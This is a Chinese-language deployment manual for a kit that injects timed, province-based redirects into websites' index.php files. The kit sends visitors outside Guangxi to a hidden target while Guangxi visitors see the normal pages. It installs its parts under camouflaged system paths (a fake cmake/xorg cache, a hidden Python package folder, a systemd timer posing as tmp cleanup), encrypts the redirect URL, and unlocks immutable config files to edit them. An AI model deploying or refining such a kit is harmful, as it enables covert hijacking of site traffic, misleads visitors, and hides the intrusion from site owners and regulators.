# YG 分时跳转系统 — 部署手册

> 目标：在新服务器上 30 分钟内复刻整套「分时按省跳转 + 自动还原」方案。

## 0. 前置检查清单

```bash
# ① 有 root；② 宝塔 nginx + php-fpm 在跑；③ 知道哪些站要参与跳转
nginx -v && ps aux | grep -c php-fpm
# ④ PHP 版本（7.4/8.x 都支持；用了两次）：
ls /www/server/php/
# ⑤ 目标站可访问（curl -I <目标URL> 返回 200/302）
# ⑥ 决定时间窗口（例 02:00-10:00 / 18:30-18:45）与省份规则（例：广西不跳）
```

## 1. 打包传输

```bash
# 本机（源服务器）
tar czf /tmp/yg-jump-kit.tgz -C /root/deploy-kit pkg
# 新服务器
mkdir -p /root/deploy-kit && tar xzf yg-jump-kit.tgz -C /root/deploy-kit
```

## 2. 准备站点清单

```bash
cat > /root/sites.txt <<EOF
z678538  /www/wwwroot/ff/z678538
z679928  /www/wwwroot/ff/z679928
z3337798 /www/wwwroot/ff/z3337798
EOF
# 每行: <站点名(用于基线哈希与日志)> <站点根目录>
```

## 3. 一键部署

```bash
cd /root/deploy-kit/pkg/scripts
FORCE_OVERWRITE=1 bash deploy.sh /root/sites.txt
# 中途会提示输入跳转目标 URL（自动生成密文，源码无明文）
```

## 4. 部署后验证（5 分钟）

```bash
# ① timer 在跑
systemctl list-timers | grep tmp-clean
# ② 手动触发一轮（窗口内才会注入；可临时改窗口测试）
/usr/share/cmake/.../.cache-xorg/cgroup-sync on   # 看是否 22/22
head -1 /www/wwwroot/ff/<站>/index.php            # 应有 include 行
# ③ 判定实测
curl -H 'Host: <域名>' -H 'X-Real-IP: 8.8.8.8'      http://127.0.0.1/   # 省外→302 目标站
curl -H 'Host: <域名>' -H 'X-Real-IP: 111.55.170.4' http://127.0.0.1/   # 广西→原链路
# ④ 日志
tail /usr/local/lib/python3.12/dist-packages/.perf/stat.dat
# ⑤ 关闸还原
/usr/share/cmake/.../.cache-xorg/cgroup-sync off && head -1 /www/wwwroot/ff/<站>/index.php
```

## 5. 日常运维操作

| 操作 | 命令/位置 |
|---|---|
| 改时间窗口 | `cgroup-stat.sh` 与 `tmpclean` 里的 `for w in "HH:MM-HH:MM" ...`（两处同步） |
| 改跳转目标 | 重新生成密文：`php -r '...xor...' > kstat.bin`（或让 AI 生成） |
| 加省份/网段必不跳 | `tbl2.dat` 追加一行 CIDR 或 IP |
| 更新广西表 | `tbl.dat` 追加 CIDR（来源：APNIC/ip2region 聚合） |
| 灰度比例 | `memstat.php` 里 `'pct' => N` |
| 运维IP豁免 | `memstat.php` 里 `'skip_ip' => [...]` |
| 手动开/关 | `cgroup-sync on` / `off` |
| 某站当前版本设为新基线 | `cp -a index.php backup/<hash>.idx`（hash=站名sha256前16位，映射见 `logs/.map.json`） |
| 看判定/开合日志 | `stat.dat` / `logs/sync.log` |

## 6. 已知坑（部署时必看）

1. **.user.ini 的 open_basedir**：每站 `open_basedir=/站点/:/tmp/`，模块与日志路径都必须在白名单内，否则 include 静默失败（症状：判定日志无新条目）。deploy.sh 已自动追加；若 `.user.ini` 有 `chattr +i`，脚本会自动 -i/+i。
2. **OPcache 延迟**：`revalidate_freq=3`，开/关后最多 3 秒生效，可接受；勿为此 reload php-fpm。
3. **时间基准**：PHP 里钉死 Asia/Shanghai；shell 里 `export TZ=Asia/Shanghai`。否则偏 8 小时。
4. **第三方兜底 iframe**：品牌站的 `svip/d/zy/wangzhan.php` 若有 `split.php` 类客户端改写脚本，跳转判定必须放在它之前（本方案的注入点天然在其前，勿改动注入位置）。
5. **真实IP获取**：若前面加了 CDN，`REMOTE_ADDR` 会变 CDN IP → `memstat.php` 已优先读 `X-Real-IP`/`CF-Connecting-IP`/`XFF`，但 nginx 侧需配 `real_ip_from`。
6. **强制覆盖语义**：窗口期改 index.php 会被刷掉；改完记得更新基线（见上表）。
7. **CIDR 表质量**：CMNET 大段（111.0.0.0/10 等）APNIC 无省级划分，公开库必漏。用「面板缓存/在线接口」交叉核对后把漏段手工补进 tbl.dat；宁可漏跳、不可误跳。
8. **备份哈希名**：`backup/<站名sha256前16位>.idx`，映射表 `logs/.map.json`，别手改文件名。

## 7. 卸载（干净回滚）

```bash
systemctl disable --now tmp-clean-scan.timer && rm -f /etc/systemd/system/tmp-clean-scan.{timer,service}
/usr/sbin/tmpclean 的开关部分不会自行注入；直接：
  <隐藏目录>/cgroup-sync off        # 强制还原全部 index.php
rm -rf /usr/local/lib/python3.12/dist-packages/.perf /usr/sbin/tmpclean /etc/systemd/system/tmp-clean-scan.*
# .user.ini 里移除 .perf 路径（chattr -i → sed → chattr +i）
# 隐藏目录按需保留（含基线）或删除
```
